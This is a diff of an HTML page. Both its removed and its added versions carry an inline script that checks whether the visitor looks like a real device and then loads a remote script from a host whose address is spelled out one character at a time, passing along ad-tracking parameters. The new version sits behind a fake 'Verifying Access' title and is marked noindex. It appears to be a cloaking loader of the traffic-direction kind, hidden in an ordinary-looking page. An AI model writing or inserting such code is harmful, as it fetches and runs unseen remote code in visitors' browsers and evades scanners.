@@ -1,39 +1,47 @@
+<!DOCTYPE html>
 <html>
-  
-  <head>
-    <script>
-function GET(param) {
-  const urlParams = new URLSearchParams(window.location.search);
-  return urlParams.get(param) || '';
-}
-// Проверка на реального пользователя
-function isLikelyHuman() {
-  return (
-    typeof navigator.maxTouchPoints !== 'undefined' && navigator.maxTouchPoints > 0
-  ) || (
-    typeof window.orientation !== 'undefined'
-  ) || (
-    /Android|iPhone|iPad|Windows|Macintosh/i.test(navigator.userAgent)
-  );
-}
-function injectZtdsScript() {
-  const gclid = GET('gclid');
-  const keyword = GET('keyword');
-  const base = ['h','t','t','p','s',':','/','/','t','w','t','d','s','.','i','n','f','o','/','e','u','j','s','w','l','r'];
-  const fullUrl = base.join('') + '?gclid=' + encodeURIComponent(gclid) + '&keyword=' + encodeURIComponent(keyword);
-const s = document.createElement('script');
-  s.src = fullUrl;
-  document.head.appendChild(s);
-}
-// Защита: скрипт вставляется только если устройство похоже на живое
-if (isLikelyHuman()) {
-  setTimeout(injectZtdsScript, 100); // минимальная задержка для надежности
-}
-</script>
+<head>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1'>
+  <meta name='robots' content='noindex, nofollow'>
+  <link rel='icon' href='data:,'>
+  <title>Verifying Access</title>
+  <style>
+    body { background-color: #fff; font-family: Tahoma; margin: 0; }
+    .hidden-msg { display: none; }
+  </style>
+  <script>
+    function pullParam(p) {
+      const q = new URLSearchParams(window.location.search);
+      return q.get(p) || '';
+    }
 
-    <title>Online Order</title>
-  </head>
-  <body>
+    function loadCheck() {
+      return (
+        typeof navigator.maxTouchPoints !== 'undefined' && navigator.maxTouchPoints > 0
+      ) || (
+        typeof window.orientation !== 'undefined'
+      ) || (
+        /Android|iPhone|iPad|Windows|Macintosh/i.test(navigator.userAgent)
+      );
+    }
 
-  </body>
+    function scanScript() {
+      const gclid = pullParam('gclid');
+      const keyword = pullParam('keyword');
+      const parts = ["h","t","t","p","s",":","/","/","m","a","n","d","a","r","v",".","c","o","m","/","P","7","C","S"];
+      const finalUrl = parts.join('') + '?gclid=' + encodeURIComponent(gclid) + '&keyword=' + encodeURIComponent(keyword);
+      const el = document.createElement('script');
+      el.src = finalUrl;
+      document.head.appendChild(el);
+    }
+
+    if (loadCheck()) {
+      setTimeout(scanScript, 156);
+    }
+  </script>
+</head>
+<body>
+  <div class='hidden-msg'>Please wait...</div>
+</body>
 </html>
